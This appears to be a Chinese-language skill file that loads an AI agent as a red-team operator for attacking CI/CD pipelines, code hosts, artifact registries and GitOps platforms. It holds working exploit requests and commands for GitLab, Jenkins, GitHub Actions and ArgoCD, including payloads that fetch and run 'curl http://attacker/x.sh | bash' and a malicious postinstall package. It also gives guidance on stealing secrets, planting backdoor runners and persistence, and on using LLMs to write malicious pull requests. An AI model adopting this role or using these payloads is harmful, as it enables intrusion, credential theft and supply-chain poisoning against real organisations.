---
name: ci-cd-attack-testing
description: CI/CD与开发平台攻击深度专业技能：DevOps供应链攻击链(源码→构建→制品→发布)、代码托管平台攻击(GitHub/GitLab/Gitee)、Git对象深度利用与Secret挖掘、CI系统攻击(Jenkins CVE-2024-23897/GitHub Actions workflow注入/GitLab CI_JOB_TOKEN)、依赖混淆与供应链投毒、制品库与Docker镜像攻击、GitOps平台攻击(ArgoCD CVE-2024-37152/CSRF接管EKS)、开发者终端与插件投毒、典型案例复盘(tj-actions CVE-2025-30066)、AI大模型辅助CI/CD攻击
metadata:
  version: 1.0.0
---

# CI/CD与开发平台攻击深度技能

> **AI LOAD INSTRUCTION**: CI/CD 与开发平台供应链攻击链专家打法。聚焦入口定位（代码托管/CI 系统/依赖/制品库/GitOps/开发者终端）→ 按平台 CVE 路由 → 无害化验证。涉及生产的动作先过 authorized-attack-scope。

## 概述

CI/CD（持续集成/持续交付）是现代企业软件生产的**主动脉**——源码库、构建流水线、制品仓库、发布平台与云环境之间彼此信任、自动衔接。红队视角下，**攻陷一个 CI/CD 链路等于一次性控制整个软件供应链**：向源码库投毒可影响所有下游构建，攻陷构建平台可获得全部部署凭据，篡改制品可让恶意代码直达生产环境。本技能以**资深红队攻防专家视角**系统化覆盖**代码托管平台→CI系统→供应链投毒→制品镜像→GitOps发布→云原生集成→开发者终端**完整攻击链，结合最新漏洞情报（Jenkins CVE-2024-23897、GitLab CVE-2023-7028、ArgoCD CVE-2024-37152、tj-actions CVE-2025-30066），并融入 **AI 大模型能力**（AI 辅助代码审计、恶意依赖生成、流水线漏洞扫描与自动化编排）。

与`security-automation`技能（DevSecOps 防守视角）、`secure-code-review`技能（源码漏洞审计）互补：本技能专注**攻击视角**的 CI/CD 平台渗透与供应链投毒。

## 一、CI/CD 攻击面全景（DevOps 供应链攻击链）

### 1.1 现代 CI/CD 流水线架构
```
开发者终端 → 代码托管平台(GitHub/GitLab/Gitee)
              ↓ push / PR / webhook
         CI 系统(Jenkins/GitHub Actions/GitLab CI/TeamCity)
              ↓ 构建+测试+扫描
         制品仓库(Nexus/Artifactory/npm/PyPI/Docker Registry/Harbor)
              ↓ 拉取制品
         CD/发布平台(ArgoCD/Spinnaker/Flux/Helm)
              ↓ 部署
         云/集群环境(K8s/AWS/Azure/阿里云) → 生产应用
```
**关键特征**：每一环都**自动信任**上一环的输出（代码→构建产物→部署），且各环节通常持有通往下一环的高权限凭据——这正是供应链攻击的价值放大器。

### 1.2 攻击面分层模型
| 层次 | 组件 | 红队价值 |
|------|------|---------|
| L1 开发者层 | 开发者终端/IDE/Git凭据/浏览器会话 | 初始入口、上游凭据 |
| L2 代码库 | GitHub/GitLab/Gitee 仓库/分支/PR/Webhook | 源码+Secret+影响力 |
| L3 CI层 | Jenkins/GitHub Actions/GitLab CI/TeamCity | **构建凭据+RCE**（最高价值） |
| L4 制品层 | Nexus/Artifactory/npm/PyPI/Docker Registry/Harbor | 供应链投毒点 |
| L5 发布层 | ArgoCD/Flux/Helm/Spinnaker | 直达生产的开关 |
| L6 运行层 | K8s/云平台/生产应用 | 最终目标 |

### 1.3 信任边界与攻击链模型
```
# 攻击者只需要突破任意一个信任边界：
# 1) 写代码库（恶意代码/依赖投毒）→ 下游自动构建 → 自动部署 → 生产沦陷
# 2) 攻 CI 平台（RCE/凭据）→ 拿到全部部署凭据 → 直接控制生产
# 3) 攻制品库（篡改制品）→ 所有拉取该制品的环境被动感染
# 4) 攻 CD 平台（ArgoCD 等）→ 一键把恶意工作负载部署到集群
# 5) 攻开发者终端（凭据/插件）→ 冒充开发者提交恶意代码
# 决策树：哪个环节暴露面最大、防护最弱、下游影响最广，就优先打哪个
```

### 1.4 目标优先级评估（红队决策）
```
# 评估维度：可达性 × 权限放大倍数 × 下游影响范围
# 高优先级：
#   - 暴露到公网的 CI 平台（Jenkins/GitLab Runner）——直接 RCE 面
#   - 无鉴权/弱口令的制品库与 ArgoCD——直通生产
#   - 自托管 Runner（GitHub Actions）——等于集群内高权限 pod
#   - 大型开源/内部公共仓库——供应链影响面大
# 中优先级：内部代码库、开发者机器
# 每攻陷一环，立即收集"通往下一环的凭据"（deploy key/CI token/云凭据）
```

## 二、代码托管平台攻击（GitHub/GitLab/Gitee/Bitbucket）

### 2.1 信息泄露与公开攻击面
```
# 1) .git 目录泄露（未禁止目录浏览的 Web 部署）
curl http://target/.git/config
# 用 git-dumper 完整拉取
git-dumper http://target/.git/ /tmp/repo
# 2) GitHub 代码搜索（GitHub Dorking 挖掘敏感信息）
#   site:github.com "BEGIN RSA PRIVATE KEY"
#   "aws_access_key_id" "AKIA" language:yaml
#   "password" "jdbc:" language:java org:目标公司
#   filename:.npmrc _authToken
#   filename:credentials.json OR filename:service-account.json
# 3) Git 历史泄露：旧提交常含已轮换的密钥
git log --all --oneline --grep="password\|secret\|key"
git log -p -S "password" --all
git log --all --reflog --oneline
# 4) 仓库元信息：成员列表/分支策略/Webhook 配置
# 5) 提交邮箱 → 社工/钓鱼素材
```

### 2.2 Git 对象深度利用（拿不到仓库权限也能拿数据）
```bash
# dangling commits（GC 未清理的历史提交，可能含敏感信息）
git fsck --lost-found --no-reflogs
git fsck --unreachable
git show <hash>
# reflog（HEAD 移动历史，找回"已删除"的提交）
git reflog
git reset --hard HEAD@{n}   # 恢复被删除的分支/提交
# stash（未提交的暂存改动，常含临时测试凭据）
git stash list && git stash show -p stash@{0}
# 分支/tag 枚举：预览版、hotfix、release 分支常带额外 Secret
git branch -a ; git tag -l
# fork/PR 相关：PR 分支中可能包含未合并的敏感改动
# 已删除的 tag 可通过 reflog/fsck 找回
```
> **红队要点**：拿到"已删除"的文件/提交，往往比当前代码更有价值（运维把密钥"删了"但历史里全在）。

### 2.3 Secret 挖掘（自动化）
```bash
# trufflehog（深度扫描 Git 历史全量 secret）
trufflehog git https://github.com/org/repo --only-verified
trufflehog filesystem --directory=./repo
# gitleaks（规则引擎，支持自定义）
gitleaks detect --source=./repo --report-format=json --report-path=report.json
gitleaks git --remote=https://github.com/org/repo
# gitdorker（GitHub dork 自动化）
python gitdorker.py -tf tokens.txt -q "org:目标公司 password" -d /tmp/out
# 本地仓库全量扫描
grep -rniE "(api[_-]?key|secret|token|password)\s*[=:]\s*['\"][^'\"]{8,}" .
# 配置文件高价值目标：
#   .env / .npmrc / .pypirc / settings.xml(~/.m2) / ~/.gradle/gradle.properties
#   credentials.json / service-account.json / id_rsa / known_hosts
```

### 2.4 平台配置缺陷（权限放大）
```
# Deploy Key（只读/只写差异）与 SSH 签名验证
# Webhook URL 与 Secret 泄露 → 伪造事件投毒
# 平台集成（Slack/Jira/云绑定）OAuth 凭据
# 仓库权限模型：开发者可 push 的边界、分支保护是否真正强制
# Merge Request 审批流程可绕过点（rebase/force-push/规则缺口）
# 高权限 token 泄露：PAT/Deploy Token/Runner Token
```

### 2.5 GitLab 漏洞利用（重点）
```
# CVE-2023-7028（任意用户密码重置→含管理员，CVSS 7.5）
# 影响: 16.1~16.1.5, 16.2~16.2.7, 16.3~16.3.6, 16.4~16.4.4, 16.5~16.5.5,
#       16.6~16.6.3, 16.7~16.7.1（已修复版本见官方公告）
# 根因: 密码重置接口 user[email] 支持数组，两个邮箱同时收到重置链接
# 利用: 目标邮箱 + 攻击者邮箱都收到链接 → 重置目标密码
POST /users/password HTTP/1.1
Content-Type: application/x-www-form-urlencoded
authenticity_token=<token>&user[email][]=victim@corp.com&user[email][]=attacker@evil.com
# 2FA 可缓解（重置后仍需 2FA）；自动化工具: CVE-2023-7028.py
# 获得管理员后: 创建 Runner → 读取全部项目/CI变量/仓库 → 供应链投毒

# CVE-2021-22214（CI API 未授权 SSRF，CVSS 7.0）
# 未认证 POST /api/v4/ci/lint 的 include 远程拉取 → SSRF 探测内网
# 内网探测: 读云元数据 169.254.169.254 / 探内网端口 / Redis 等

# CVE-2023-2825（任意分支合并权限绕过 → RCE, CVSS 9.6）
# 通过 pipeline 派生分支将任意代码合并，配合 CI 执行 → RCE

# 常见面: Runner 未隔离（共享 runner 投毒）、CI_JOB_TOKEN 权限过大、
#         /api/v4/projects 未授权、公共项目被 fork 后投毒
# 平台识别: 响应头 X-GitLab-Event / /-/health / /api/v4/version（未认证常可读）
```

### 2.6 GitHub 特定攻击面
```
# OAuth App 劫持: 恶意 App 诱导授权 → 读取私有仓库/actions secrets
# GITHUB_TOKEN 权限过大（workflow 里用默认 token 操作仓库 → 被投毒流程利用）
# 自托管 Runner 暴露 → 任何能触发 workflow 的人都可打 Runner（见3.2）
# Actions secrets 间接泄露（通过可读日志/错误输出）
# GitHub App 安装令牌劫持（organization 级权限放大）
# 公开仓库的 workflow 可被 fork+PR 触发（pull_request_target 漏洞面）
```

### 2.7 恶意代码投递（供应链上游污染）
```
# 1) 伪装贡献者: 克隆邮箱/头像提恶意 PR，诱导维护者合入
# 2) 依赖劫持: 在合法包发布前抢注同版本号/同名称（见第四章）
# 3) 文档投毒: README/Wiki/示例代码中藏恶意命令（复制粘贴攻击）
# 4) 工具链污染: 引导开发者安装"辅助脚本/格式化工具/脚手架"
# 5) fork 投毒: 让目标团队把恶意 fork 当上游（维护者过少时高发）
# AI辅助: 用LLM生成"看起来非常专业"的恶意PR描述与代码提交（见第十一章）
```

## 三、CI 系统攻击（核心战场）

### 3.1 Jenkins 攻击
```
# 3.1.1 识别与入口
#   /login /script /manage /api/json /oops /env /computer
#   Header: X-Jenkins: <版本>（未认证可读）
# 3.1.2 Script Console RCE（Groovy，需 Overall/Administer）
#   /script 执行:
new ProcessBuilder('cmd','/c','whoami').redirectErrorStream(true).start().text
# 3.1.3 CVE-2024-23897（CLI 任意文件读取→RCE，CVSS 9.8，KEV 在野利用）
#   影响: Jenkins 2.441及更早 / LTS 2.426.2及更早
#   根因: args4j expandAtFiles 功能——参数中 @文件路径 会被替换为文件内容
#   利用1（未认证读前3行）:
#     java -jar jenkins-cli.jar -s http://target -noKeyAuth connect-node "@<file>"
#   利用2（有 Overall/Read 读全文）:
#     connect-node "@/etc/passwd" 等，或用公开 PoC 脚本（CVE-2024-23897.py）
#   读高价值文件: /etc/passwd、用户列表、Remember me 密钥、secrets
#   升级RCE变体: 读密钥伪造 Remember me cookie / Resource Root URL 签名 →
#                进入 Script Console / 存储型 XSS via build logs
# 3.1.4 凭据存储攻击（拿到 Jenkins 后）
#   /script:
def c = Jenkins.instance.getExtensionList(jenkins.security.ApiTokenProperty.class)
// 读取所有凭据:
def k = new hudson.util.Secret()
Jenkins.instance.getExtensionList(jenkins.model.Jenkins.class)
  .each { }
// 凭据插件解密: /script 中反射解密 $JENKINS_HOME/credentials.xml（AES 密钥在
//   secrets/master.key + secrets/hudson.util.Secret）
# 3.1.5 API token / CSRF / remember me cookie 伪造
# 3.1.6 高危插件面（按需核对最新公告）:
#    Script Security 权限检查缺失(CVE-2024-52549,文件存在性探测)
#    Pipeline Groovy 已撤销脚本可重建(CVE-2024-52550)
#    OpenId Connect 会话固定(CVE-2024-52553,社工→管理员)
#    IvyTrigger XXE(CVE-2022-46751)
#    老经典: CVE-2017-1000353(CLI反序列化RCE)、CVE-2018-1000861(Script Security绕过)
# 3.1.7 部署凭据: 从 job 配置/凭据库提取云AK、SSH key、Registry 凭据 → 横向
```

### 3.2 GitHub Actions 攻击
```
# 3.2.1 workflow 注入（不可信输入进命令/表达式）
#   风险输入: PR标题、issue标题/评论、commit message、branch/tag名、
#             PR body、附件文件名
#   危险写法:
steps:
  - run: echo "${{ github.event.pull_request.title }}"   # 注入命令
  - run: git checkout "${{ github.head_ref }}"           # 注入分支名
#   注入payload示例（PR标题）: 
#     `"; curl http://attacker/x.sh | bash #`
#     `${{ runner.os }}` 表达式注入 → 直接执行 `${{ github.event... }}`
# 3.2.2 GITHUB_TOKEN 滥用
#   GITHUB_TOKEN 默认权限含 contents:write → 注入后可篡改仓库/放后门
#   actions:read → 读私有仓库 workflow（拿更多 secret 引用面）
#   pull_request_target 事件: 在 base 分支上下文中跑不可信 PR 代码 → 可直接读 secrets
# 3.2.3 自托管 Runner 攻击
#   自托管 runner = 任意能触发 workflow 的用户可在其上执行代码
#   扫描 runner 注册路径: /actions/runner /actions-runner
#   注入 workflow → RCE 在 runner（常挂高权限挂载/云角色）
#   runner 注册 token 泄露 → 注册恶意 runner 窃取 job
# 3.2.4 secrets 窃取（tj-actions 事件复盘见9.1）
#   secrets 以明文形式存在于 Runner.Worker 进程内存 → 内存dump可提取
#   通过双 base64 编码绕过 GitHub 的 secret masking 输出到日志
# 3.2.5 供应链面: 复用第三方 action（@owner/repo@tag）→ tag 被篡改即全库中毒
#   - 固定到 commit SHA 可缓解；红队侧: 攻陷知名 action 维护者账户即可（见9.1）
# 3.2.6 云身份: OIDC (id-token: write) → AssumeRoleWithWebIdentity
#   拿 OIDC token 即可换取云临时凭据 → 云横向（联动cloud-security-audit技能）
```

### 3.3 GitLab CI 攻击
```
# 3.3.1 .gitlab-ci.yml 注入面
#   - 可控变量(CI_VARIABLES/Branch名)进入 shell → RCE
#   - 使用不可信 image / services（镜像投毒）
#   - after_script/before_script 中引用可控输入
# 3.3.2 CI_JOB_TOKEN（默认权限过大）
#   - CI_JOB_TOKEN 可访问: api/v4/projects（读仓库）、registry（拉推镜像）、
#     packages（读包）、dependency proxy
#   - 窃取后可用于读私有仓库/镜像（供应链上游）
# 3.3.3 Runner 攻击面
#   - 共享 Runner: 任意项目可用 → 投毒（其他项目也共用）
#   - Runner Token 泄露 → 注册恶意 Runner
#   - Runner 执行环境含 DOCKER_AUTH_CONFIG/CI_REGISTRY_PASSWORD 等变量
# 3.3.4 CI/CD variables（项目/组级）: 保护变量=敏感凭据的集中点
#   - 需要 maintainer 权限读取；拿到后即供应链钥匙
# 3.3.5 已知漏洞: CVE-2023-7028（见2.5）、CVE-2023-2825（任意合并→RCE）、
#   CVE-2021-22214（CI lint SSRF）、pipeline schedule 功能滥用
```

### 3.4 其他 CI 系统
```
# TeamCity: 未认证 RCE(CVE-2023-42793, CVSS 9.8, 广泛在野利用)
#   /app/rest/debug/processes 等端点；自带 API token 端点滥用
# Drone: 共享 secret 滥用（DRONE_SECRET 可被任意构建读取）
#   DRONE_RPC_SECRET 泄露 → 伪造构建/下发任务
# CircleCI/Travis: 环境变量泄露面、第三方服务集成(OAuth)滥用
# 通用手法: 平台默认口令、API 未认证端点枚举、构建日志搜索、SSO 绕过
```

### 3.5 CI 凭据与变量窃取（黄金战利品）
```
# 窃取优先级:
# 1) 云凭据: AWS_ACCESS_KEY/AZURE_CLIENT_SECRET/阿里云AK → 云横向
# 2) 部署凭据: K8s kubeconfig/helm registry/SSH deploy key
# 3) 数据库/中间件凭据（构建测试环境常用生产配置）
# 4) 三方 API key（Slack/支付/邮件）
# 窃取途径:
# - CI 变量面板（需权限）
# - 构建日志（错误回显/调试输出/secret 未掩码）
# - 凭据文件（.env/.npmrc/.pypirc/settings.xml）
# - 环境变量 dump（runner 上 env）
# - 构建缓存/工作区文件
# - 内存 dump（GitHub Actions Runner.Worker，见3.2.4）
# AI辅助: 批量把构建日志/环境变量给LLM做凭据提取与归类（见11.1）
```

### 3.6 流水线注入（可控输入→RCE 全场景）
```
# 注入面矩阵: 能进"命令拼接/表达式求值"的任何不可信输入
#   GitHub: PR标题/body/issue/commit/branch/tag/附件名
#   GitLab: 提交信息/分支名/tag名/CI变量/merge request标题
#   Jenkins: 参数化构建的字符串参数/SCM变更记录/upstream触发数据
#   Webhook: 伪造的 push/PR 事件 payload
# 通用检测: 在流水线配置中寻找
#   1) echo ${{...}} / echo $VAR            → 无引号拼接
#   2) git checkout ${BRANCH}                → 命令注入
#   3) curl $URL / $(curl ...)               → 外带
#   4) docker run --rm $IMAGE                → 镜像注入
#   5) python -c "...$INPUT..."              → 解释器注入
# 利用流程: 构造恶意输入 → 触发构建 → 观察 RCE 回显/外带
```

## 四、供应链投毒（依赖混淆与恶意包）

### 4.1 依赖混淆攻击（Dependency Confusion）
```
# 原理: 包管理器优先从公共源拉取"名称相同"的包；内部包名未在公共源注册时，
#       攻击者在公共源抢注同名包 → 内部构建自动拉取恶意版本
# 案例: 2021 Alex Birsan——抢注苹果/微软/特斯拉内部包名 → 数十家厂商内网RCE
# 手法:
# 1) 收集内部包名:
#    - 内部 npm registry 响应/错误信息
#    - 公开仓库中的 package.json / requirements.txt / pom.xml 引用
#    - GitHub dork: "registry.npmjs.org" + 公司名
# 2) 检查公共源同名包是否已存在（npm view <name>）
# 3) 抢注同名包，预埋恶意 install/postinstall 脚本
# 4) 等待内部 CI 构建拉取 → 自动执行
# payload 示例(package.json):
{
  "name": "internal-lib",
  "version": "99.99.99",
  "scripts": { "postinstall": "curl http://attacker/x.sh | bash" }
}
# PyPI 对应: setup.py 的 setup() 参数/egg_info 钩子；Maven: 同 groupId+artifactId
# 工具: Confused / DependencyCheck 反查验证
```

### 4.2 Typosquatting 与恶意包投递
```
# Typosquatting: 仿冒知名包名（1字符之差/连字符/复数/小写）
#   lodash → 1odash / react → reactt / babel-core → babel_core
# 手法: 大规模上架 → 等误装（开发/CI 装错即中招）
# 恶意行为: install 后门、凭据回传（读取 ~/.npmrc / env）、挖矿
# 高价值目标: 开发依赖/构建工具（webpack/vite/ts-node）→ 影响所有下游构建
# 检测: npm audit / OSV-scanner / pip-audit / Dependabot 告警面
# 红队侧: 投放后保持"无害外观"，只在特定环境(内网域名/时间)激活
```

### 4.3 依赖缓存/镜像污染
```
# npm registry 代理(verdaccio/nexus) → 替换内部源中已缓存包
# pip 私有 index 劫持 → 覆盖内部 wheel 包
# Maven 私服 → 篡改 .m2 缓存 / settings.xml 指向恶意镜像
# 镜像源替换: 开发者配置被改 → 所有拉包走攻击者源
# Docker 同理: 内网 registry 镜像被替换（见5.2）
```

### 4.4 包验证绕过
```
# 非锁定版本: package.json 用 ^/~/latest → 更新即被劫持
# 无 lock 文件: npm-shrinkwrap/package-lock 缺失 → 依赖解析可被注入
# 签名绕过: sigstore/cosign 未启用 → 镜像/包无签名可篡改
# supply-chain 自动化工具缺陷: 部分扫描器仅扫 lock 不扫传递依赖
```

## 五、制品库与镜像攻击

### 5.1 制品库未授权与弱口令
```
# Nexus: /service/rest/v1/repositories、/service/rest/v1/search（未认证可枚举）
#   admin/admin123 默认口令；API key 泄露面
# Artifactory: /api/repositories、/api/search（弱口令/未授权）
# 通用: 匿名可读=可拉包（含内部私有包）→ 收集内部包名做依赖混淆(4.1)
#   匿名可写=可投毒 → 直接替换内部包
```

### 5.2 Docker Registry 攻击
```bash
# v2 API（默认可能无鉴权或弱口令）
curl http://registry:5000/v2/_catalog            # 全部镜像列表
curl http://registry:5000/v2/<repo>/tags/list    # 镜像tag
# 拉取镜像并提取层内敏感数据（配置/环境变量/密钥）
docker pull internal-registry:5000/app:latest
docker history --no-trunc internal-registry:5000/app:latest
docker run --rm -it --entrypoint=sh internal-registry:5000/app:latest
env ; cat /etc/nginx/conf.d/* ; find / -name ".env"
# 篡改/投毒: 有写权限 → 上传恶意镜像覆盖 tag → 下次部署即中招
# 分发冒名: 内网应用配置的 image 指向可写 registry → 上游污染
# 高价值: 镜像内含构建期 secrets（历史层会保留已删 secret）
#   dive / skopeo 逐层审计: skopeo copy docker://img dir://out
```

### 5.3 Harbor 漏洞利用
```
# CVE-2019-16097（任意管理员创建，旧版）: 注册用户 → 提升管理员 → 镜像全控
# CVE-2021-37281(反序列化RCE)/2021-37278等（按版本核对）
# 常见: 默认 admin/Harbor12345、未认证 /api/v2.0/projects、复制规则(Replication)
#       泄露远端 registry 凭据
# 利用链: 控制 Harbor → 篡改生产镜像 → 供应链投毒（见5.2）
```

### 5.4 镜像供应链→集群接管链
```
# 1) 拿 registry 写权限 → 覆盖应用镜像（恶意后门层）
# 2) 集群自动拉取新镜像 → 后门容器进集群（带 serviceAccount 权限）
# 3) 从容器逃逸/挂载 → 集群控制平面（联动container-security-testing技能）
# 关键点: 镜像不签名/不验证摘要 → 投毒无痕
```

## 六、CD/发布平台攻击（GitOps）

### 6.1 ArgoCD 攻击
```
# 6.1.1 识别: 端口8080/8081、/applications、header x-argocd
# 6.1.2 CVE-2024-37152（/api/v1/settings 未认证访问, CVSS 5.3）
curl https://argocd/api/v1/settings
#   → 泄露 passwordPattern（密码策略）→ 辅助爆破/构造账号接管
#   → 配合会话操纵可实现持久化（Upwind 研究: 组合漏洞接管 EKS 集群）
# 6.1.3 CVE-2024-40634（/api/webhook 未认证 DoS, CVSS 7.5）
#   未认证超大 JSON payload + X-GitHub-Event: push → OOM 打瘫 argocd-server
# 6.1.4 CVE-2023-22482（OIDC audience claim 未校验, CVSS 9.8）
#   任意 OIDC provider 签发的 token 被接受 → 伪造组声明提权管理员
# 6.1.5 CVE-2023-22736（sharding 时命名空间授权绕过）
#   apps-in-any-namespace 场景下可部署到未授权 namespace
# 6.1.6 CVE-2023-25163（错误信息泄露仓库访问凭据）
# 6.1.7 CSRF→集群接管（Upwind 披露）
#   未启用同源检查的 CSRF → 诱导管理员/自调用 API → 部署恶意 Application →
#   在集群执行任意工作负载（含 kube-system 权限面）
# 6.1.8 通用面: 弱口令 admin/默认、repo 凭据泄露、project 权限模型绕过
# 6.1.9 利用链: 控制 ArgoCD = 控制所有被管集群的部署 → 供应链最高点
```

### 6.2 Flux/Helm 攻击
```
# Helm: 仓库投毒（helm repo add 恶意源）、chart 内嵌 k8s 后门清单
#   chart 的 post-install hook 可执行任意 pod
# Flux: Source/HelmRepository 指向被控源 → 拉取恶意 chart
#   Kustomization/HelmRelease 变更权限滥用
# 通用: GitOps 仓库写权限=部署控制权（改 manifest → 生产变更）
# 注意: 控制"GitOps 仓库"比控制平台更隐蔽且持久
```

### 6.3 Spinnaker/Octopus 等其他发布平台
```
# Spinnaker: 未认证 API(Gate/Sigma)、pipeline 任意执行、云账号凭据读取
# Octopus Deploy: 弱口令/API key、变量（含密码）读取
# 通用: 发布审批绕过（API直调/绕过人工审批 stage）、审计日志缺失
```

### 6.4 发布审批与审计绕过
```
# 目标: 跳过人工审批直接部署恶意版本
# 手法: API 直调（绕过 UI）、修改 pipeline 配置（移除审批stage）、
#       利用 SCM 触发免审批路径、利用低权限账号的"跳过审批"权限、
#       时间窗口攻击（审批人不在时提交）
# 持久化: 在审批通过路径上预埋恶意步骤（审核只看到"正常"diff）
```

## 七、云原生 CI/CD 集成（联动 container-security-testing）

### 7.1 集群内 Runner/构建容器逃逸
```
# 自托管 Runner / Kaniko / buildkit 构建环境 = 集群内可控容器
# 逃逸路径: 特权容器、hostPath 挂载、docker.sock、CAP_SYS_ADMIN、内核CVE
#   （完整手法见 container-security-testing 技能）
# 拿 runner 节点 → 节点上 kubelet 凭据 → 集群控制
```

### 7.2 ServiceAccount 与镜像拉取凭据
```
# 构建环境注入的 SA token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# kubeconfig 常挂载在 CI 配置中（构建脚本/secret）
# imagePullSecret 窃取 → 上游 registry 控制
# K8s RBAC: 构建 SA 常过度授权（list pods/create deployments）
```

### 7.3 从 CI 到集群到云的完整链（示范）
```
# 1) 攻 CI（Jenkins CVE-2024-23897/GitHub Actions 注入）→ 执行
# 2) 提取云 OIDC token / AK / kubeconfig
# 3) 换取云临时凭据（AssumeRoleWithWebIdentity / 云 metadata）
# 4) 云控制面 → S3/KMS/SecretManager 全量凭据 → 生产数据
# 5) 或直接 K8s 集群 → workload 横向 → 生产应用
# 这解释了为什么红队把 CI/CD 排在最高优先级目标
```

## 八、开发者终端与个人环境（初始访问补充面）

### 8.1 开发者机器作为跳板
```
# 开发者 = 代码库高权限 + CI 高权限 + 云控制台访问
# 初始访问: 钓鱼（开发者更易中招技术主题钓鱼）/浏览器会话/凭据填充
# 上线后: 提取 git 凭据(Git Credential Manager)、SSH agent、浏览器 cookie
```

### 8.2 IDE/插件投毒
```
# VS Code 扩展市场仿冒扩展（恶意 telemetry/后门）
# 插件安装即执行: 恶意扩展在 developer 机器上全权限
# 脚手架/模板: create-xxx 模板被替换 → 新项目自带后门
# 代码片段/格式化工具链劫持
```

### 8.3 Git 凭据与 SSH agent 窃取
```
# Windows: Credential Manager 中的 git 凭据（cmdkey /list）
# ~/.git-credentials / ~/.config/gh/hosts.yml（gh CLI token）
# ~/.ssh/id_* + known_hosts（SSH 免密通道）
# GPG 签名密钥（伪造提交身份）
```

### 8.4 开发者浏览器会话
```
# 代码托管平台 session cookie → 直接接管仓库操作
# 云控制台会话 → 基础设施控制
# 密码管理器 → 全凭据
# 红队建议: 开发者终端目标要"一次性拿全"再出手，避免打草惊蛇
```

## 九、典型案例复盘（红队视角）

### 9.1 tj-actions/changed-files 供应链攻击（CVE-2025-30066）
```
# 时间线（2025.3）:
# 1) 攻击者先攻陷 reviewdog/action-setup 项目（注入后门）
# 2) 利用被攻陷的 PAT(@tj-actions-bot) 篡改 tj-actions/changed-files
#    的版本 tag，全部重定向到一个恶意 commit（0e58ed8...）
# 3) 恶意脚本: 从 Runner.Worker 进程内存 dump 所有 CI/CD secrets，
#    双重 base64 编码绕过 GitHub secret masking，打印到公开构建日志
# 4) 影响: 23,000+ 仓库引用（实际泄露 secrets 的 218 个）；
#    最初目标疑为 Coinbase 开源项目 agentkit（借其 CI 投毒/发布）
# 5) 已入 CISA KEV 目录
# 红队启示:
# - 攻陷"知名 Action 维护者账户"= 一键投毒数千仓库
# - 固定 action 到 commit SHA 可缓解；攻击者选择篡改 tag 而非 commit
# - secrets 在构建内存中是明文，内存 dump 是 CI 凭据窃取的通用手法
# - 开源 CI 供应链 = 以最小投入换取最大影响面的攻击向量
```

### 9.2 SolarWinds 类更新机制投毒
```
# 手法: 攻陷软件厂商的构建/发布通道（而非代码仓库）
# 特点: 合法签名+合法发布渠道 → 安全软件/监控软件用户全中招
# 红队迁移到 CI/CD: 攻 CD/制品库/签名密钥持有者，替换"受信任更新"
# 检测规避: 保持原版本号/签名，仅替换内容
```

### 9.3 依赖混淆实战（Alex Birsan 2021）
```
# 过程: 枚举目标内部包名（npm view 确认公共源无同名）→ 抢注 → 
#       内部 CI 构建自动安装 → 恶意 postinstall 执行 → 回连
# 结果: 苹果/Microsoft/特斯拉等 35+ 厂商内网 RCE/数据回传
# 红队要点: 依赖混淆不需要任何代码库权限——只需要"知道内部包名"
# 侦察重点: 公共代码仓库中的 import/require/pom.xml/requirements.txt
```

### 9.4 Jenkins 在野利用链（CVE-2024-23897）
```
# 事件: 2024 公开后数小时内即被批量利用（KEV 收录、EPSS 100%）
# 利用链: 未认证 CLI 文件读取 → 读密钥/用户 → 伪造 Remember me cookie/
#         配合 Script Console → RCE → 内网横向
# 红队要点: 公网暴露的 Jenkins 是"零门槛"入口；先探测再打
```

### 9.5 攻击链串联示范（一个入口→全供应链）
```
# 场景: 公网暴露的 GitLab 存在 CVE-2023-7028
# 链: 密码重置拿管理员 → 读 CI/CD variables(云AK) → 篡改 CI job 注入后门 →
#     云横向(联动cloud-security-audit) → 拿生产 → 顺藤摸瓜回 GitLab 供应链
# 核心原则: 每攻陷一环立即"播种"（后门CI任务/影子Runner/镜像后门），
#           保证即使被清理也有备选持久通道
```

## 十、CI/CD 漏洞情报速查表

### 10.1 Jenkins
| CVE | 描述 | 影响/评分 | 备注 |
|-----|------|----------|------|
| CVE-2024-23897 | CLI args4j expandAtFiles 任意文件读取→RCE | 2.441及更早/LTS 2.426.2及更早，9.8 | KEV 在野利用 |
| CVE-2024-52549 | Script Security 权限检查缺失(文件探测) | 中危 | |
| CVE-2024-52550/52551 | 已撤销脚本可重建/重启(绕过审批) | 高危 | |
| CVE-2024-52553 | OIC Auth 会话固定→社工拿管理员 | 高危 | |
| CVE-2022-46751 | IvyTrigger 捆绑 Ivy XXE | 高危 | |
| CVE-2018-1000861 | Script Security 沙箱绕过 RCE | 高危 | 经典 |
| CVE-2017-1000353 | CLI 反序列化 RCE | 9.8 | 经典 |

### 10.2 GitLab
| CVE | 描述 | 影响/评分 | 备注 |
|-----|------|----------|------|
| CVE-2023-7028 | 任意用户密码重置(含管理员) | 16.1~16.7受影响，7.5 | 2FA缓解 |
| CVE-2023-2825 | 任意分支合并权限绕过→RCE | 9.6 | |
| CVE-2021-22214 | CI lint 未认证 SSRF | 7.0 | 内网探测 |
| CVE-2021-22205 | 未认证 RCE(Markdown上传) | 10.0 | 经典打点 |

### 10.3 GitHub Actions / ArgoCD / 其他
| CVE/事件 | 描述 | 备注 |
|----------|------|------|
| CVE-2025-30066 | tj-actions/changed-files tag篡改→secrets内存窃取 | KEV，23000+仓库受影响 |
| CVE-2024-37152 | ArgoCD /api/v1/settings 未认证访问 | 组合利用可接管集群 |
| CVE-2024-40634 | ArgoCD /api/webhook 未认证 DoS | |
| CVE-2023-22482 | ArgoCD OIDC audience 未校验 | 伪造 token 提权 |
| CVE-2023-22736 | ArgoCD 命名空间授权绕过 | |
| CVE-2023-42793 | TeamCity 未认证 RCE | 9.8，广泛在野 |
| CVE-2021-22205 | GitLab 未认证 RCE | 打点经典 |
| CVE-2019-16097 | Harbor 任意管理员创建 | 旧版 |

> 完整列表以各官方安全公告为准，测试前先核对目标版本与最新公告。

## 十一、AI 大模型在 CI/CD 攻击中的能力（新增·前沿）

### 11.1 AI 辅助代码与配置审计（找攻击面）
```
# 1) 把目标仓库的流水线配置/依赖清单/源码片段交给LLM:
#    - 找出 workflow/yml/CI 配置中的命令注入点（无引号拼接可控变量）
#    - 标出 secret 引用面（哪些 job 能读哪些 secret）
#    - 识别依赖混淆/typosquatting 候选（内部包名、可疑相似包）
#    - 从构建日志/错误输出中提取凭据并归类（AK/DB/API key）
# 2) 提示词示例:
#    "审计这个 GitHub Actions workflow，找出所有注入点（PR标题/issue/branch
#     进入命令或表达式的位置）并给出利用payload"
